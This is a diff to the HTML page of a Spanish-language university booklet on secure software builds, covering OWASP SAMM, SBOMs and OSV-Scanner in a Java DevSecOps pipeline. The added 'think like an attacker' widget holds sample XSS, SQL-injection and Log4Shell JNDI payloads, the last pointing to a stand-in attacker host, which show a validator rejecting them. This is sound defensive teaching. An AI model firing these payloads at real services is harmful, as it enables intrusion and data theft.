@@ -105,11 +105,11 @@
   <p class="legal-desc">Cartilla digital con recomendaciones de desarrollo seguro centradas en el proceso de compilación, la automatización del pipeline y el control de las dependencias de terceros.</p>
   <div class="ficha">
     <div class="ficha-fila"><span class="ficha-k">Autora</span><span class="ficha-v">Nohra María Vizcaíno Florez</span></div>
-    <div class="ficha-fila"><span class="ficha-k">Institución</span><span class="ficha-v">Corporación Universitaria Minuto de Dios – UNIMINUTO</span></div>
+    <div class="ficha-fila"><span class="ficha-k">Institución</span><span class="ficha-v">Corporación Universitaria Minuto de Dios</span></div>
     <div class="ficha-fila"><span class="ficha-k">Asignatura</span><span class="ficha-v">Seguridad en el Desarrollo de Software · Semana 7</span></div>
     <div class="ficha-fila"><span class="ficha-k">Modelo guía</span><span class="ficha-v">OWASP SAMM v2.0 (Software Assurance Maturity Model)</span></div>
     <div class="ficha-fila"><span class="ficha-k">Caso práctico</span><span class="ficha-v"><a href="https://github.com/EspNohraViz/cartilla-build-seguro" target="_blank" rel="noopener">Repositorio Java Maven con pipeline DevSecOps</a></span></div>
-    <div class="ficha-fila"><span class="ficha-k">Fecha</span><span class="ficha-v">12 de octubre de 2026</span></div>
+    <div class="ficha-fila"><span class="ficha-k">Fecha</span><span class="ficha-v">11 de octubre de 2026</span></div>
   </div>
   <p class="legal-nota">Las ilustraciones, diagramas y capturas de esta cartilla son de elaboración propia, a partir del caso práctico publicado en el repositorio indicado. Las fuentes consultadas se citan en el texto y se listan en las referencias, según normas APA 7.ª edición.</p>
 </section>
@@ -359,7 +359,7 @@
     <button class="volteable" type="button" aria-pressed="false"><span class="cara frente"><svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="8"/><path d="M12 8v4l3 2"/></svg><b>Trátalas como defectos</b><small>Toca para ver</small></span><span class="cara reverso">Una dependencia vulnerable se gestiona como cualquier error propio, con responsable y plazo (OWASP, 2020, p. 153).</span></button>
     <button class="volteable" type="button" aria-pressed="false"><span class="cara frente"><svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="8"/><path d="M8 12h8"/></svg><b>Menos es más</b><small>Toca para ver</small></span><span class="cara reverso">Cada librería suma riesgo. Incluye solo las que tengan una razón válida para estar (OWASP, 2020, p. 153).</span></button>
   </div>
-  <div class="en-caso"><svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 8l-4 4 4 4M15 8l4 4-4 4"/></svg><div><p class="idea-k">En el caso práctico</p><p>El servicio no tiene dependencias en tiempo de ejecución, genera su SBOM en cada build y OSV-Scanner lo detiene si encuentra una vulnerabilidad conocida.</p></div></div>
+  <div class="en-caso"><svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><path d="M9 8l-4 4 4 4M15 8l4 4-4 4"/></svg><div><p class="idea-k">En el caso práctico</p><p>El análisis de composición de software (SCA) está automatizado en GitHub Actions. En cada cambio se genera el SBOM y OSV-Scanner detiene el build si alguna dependencia tiene una vulnerabilidad conocida, sin que nadie tenga que acordarse de revisarlo.</p></div></div>
   <details class="leer-mas"><summary>Leer más</summary>
     <p>Una aplicación moderna está hecha, en su mayor parte, de código que su equipo no escribió. Cada librería que se agrega trae a su vez otras dependencias, llamadas transitivas, y cualquiera de ellas puede convertirse en la puerta de entrada de un ataque (figura 6). Ortega (2018) ya incluía este riesgo en la categoría A9 del OWASP Top 10, que agrupa las vulnerabilidades que se presentan al usar componentes con fallas conocidas (p. 91). Esa misma categoría evolucionó hasta convertirse en la A03:2025, que hoy abarca todas las fallas de la cadena de suministro del software y no solo las vulnerabilidades conocidas (OWASP, 2025).</p>
     <p>El primer paso es saber qué se está usando. SAMM recomienda llevar un registro de todas las dependencias que llegan a producción, conocido como lista de materiales o SBOM, con datos como dónde se usa cada una, su versión, su licencia, su origen y si sigue teniendo soporte (OWASP, 2020, pp. 149-150). En el nivel 2 propone ir más allá, con una lista de dependencias aprobadas, revisiones periódicas y una regla clara, que consiste en tratar cualquier no conformidad como un defecto y apoyarse en herramientas automáticas que detecten las librerías vulnerables (OWASP, 2020, pp. 152-153). En el nivel 3, el pipeline debe fallar cuando una dependencia tenga problemas por encima de la criticidad definida (OWASP, 2020, p. 156).</p>
@@ -385,6 +385,24 @@
     </div>
   </div>
   <p class="pie-figura"><b>Tabla 1.</b> Ramas del caso práctico y compuerta que detiene cada una. Elaboración propia.</p>
+  <p class="seccion-k">Piensa como atacante</p>
+  <p class="pista"><svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><path d="M13 3 5 14h6l-1 7 8-11h-6z"/></svg>Elige un ataque o escribe tu propia entrada y mira cómo responde el servicio.</p>
+  <div class="atacante">
+    <div class="atq-btns">
+      <button type="button" data-v="RAD-2026-00123" data-tipo="Entrada legítima" data-stride="No aplica">Radicado válido</button>
+      <button type="button" data-v="&lt;script&gt;alert(1)&lt;/script&gt;" data-tipo="Cross-Site Scripting (XSS)" data-stride="T · Manipulación">XSS</button>
+      <button type="button" data-v="RAD-2026-00123' OR '1'='1" data-tipo="Inyección SQL" data-stride="I · Divulgación de información">Inyección SQL</button>
+      <button type="button" data-v="${jndi:ldap://atacante/a}" data-tipo="Log4Shell (JNDI)" data-stride="E · Elevación de privilegios">Log4Shell</button>
+    </div>
+    <label class="atq-campo"><span>GET /api/radicado?numero=</span><input type="text" spellcheck="false" autocomplete="off" aria-label="Valor del parámetro numero"></label>
+    <div class="atq-res" aria-live="polite">
+      <p class="atq-cod"></p>
+      <dl><dt>Tipo de entrada</dt><dd data-a="tipo"></dd><dt>Amenaza STRIDE</dt><dd data-a="stride"></dd></dl>
+      <p class="atq-exp"></p>
+    </div>
+  </div>
+  <p class="pie-figura">Simulación del validador del caso práctico. Las mismas entradas maliciosas se prueban en cada build con JUnit (<code>ValidadorTest</code>), así que la defensa se verifica de forma repetible.</p>
+  
   <div class="capturas"><figure class="figura captura"><a href="img/main-exitoso.jpg" target="_blank" rel="noopener"><img src="img/main-exitoso.jpg" alt="Ejecución exitosa en main con las cinco etapas en verde" loading="lazy"></a><figcaption><b>Figura 7.</b> Rama principal con las cinco compuertas superadas y el artefacto publicado. Captura propia.</figcaption></figure><figure class="figura captura"><a href="img/log4shell-sca.jpg" target="_blank" rel="noopener"><img src="img/log4shell-sca.jpg" alt="Resultado de OSV-Scanner con ocho vulnerabilidades en log4j 2.14.1" loading="lazy"></a><figcaption><b>Figura 8.</b> OSV-Scanner detiene la rama <code>demo/log4shell</code> al encontrar vulnerabilidades conocidas en Log4j 2.14.1. Captura propia.</figcaption></figure></div>
   <details class="leer-mas"><summary>Leer más</summary>
     <p>El caso práctico es un servicio web sencillo, escrito en Java 21 y construido con Maven, que permite consultar el estado de un radicado a partir de su número. La entrada se valida con una lista blanca, es decir, con una expresión regular que solo acepta el formato esperado y rechaza todo lo demás. Ortega (2018) recomienda esta técnica sobre las listas negras, porque siempre es posible enumerar los valores válidos, mientras que los valores maliciosos pueden ser innumerables (p. 82). El código, el pipeline y esta cartilla están publicados en el mismo repositorio de GitHub.</p>
